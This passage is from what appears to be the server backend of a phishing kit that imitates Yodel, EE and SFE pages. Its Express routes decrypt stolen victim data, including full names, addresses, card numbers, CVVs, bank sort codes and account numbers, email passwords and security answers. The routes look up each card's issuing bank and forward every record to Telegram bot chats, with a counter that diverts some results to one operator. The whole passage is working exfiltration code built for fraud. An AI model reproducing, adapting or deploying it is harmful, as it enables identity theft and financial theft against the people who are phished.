  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        mazCount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/yardzYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yardzCount = 6;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelYardz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Yodel:\n${originalText}`
        );
        yardzCount += 1;
      }

      res.send("Update Completed");
    });
});

let hoods = 2;

app.post("/hoodsYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

let bill = 0;

app.post("/sendBigBillz20", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        bill = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
        );
        bill += 1;
      }

      res.send("Update Completed");
    });
});

let kelvCount = 0;

app.post("/sendKelvYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//EE
//EE
//EE

app.post("/c2EE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EEC2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5348269876,
              text: `EE:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/eeKelv", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EEKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=EE:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//NZPOST
app.use("/nzpost", require("./routes/nzpost"));

//BEYOND
app.use("/beyond", require("./routes/beyond"));

//SFE
//SFE
//SFE

let bandz = 0;

app.post("/mazzaSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEMazza:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 5192776933,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

app.post("/chopsSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 990604907,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

app.post("/bandzSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 5752146124,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

let richgame = 0;

app.post("/richgameSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (richgame == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFERichGame:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 759000656,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame += 1;
  }
  res.send("Update Complete");
});

let jv = 0;

app.post("/cypherSFE", (req, res) => {
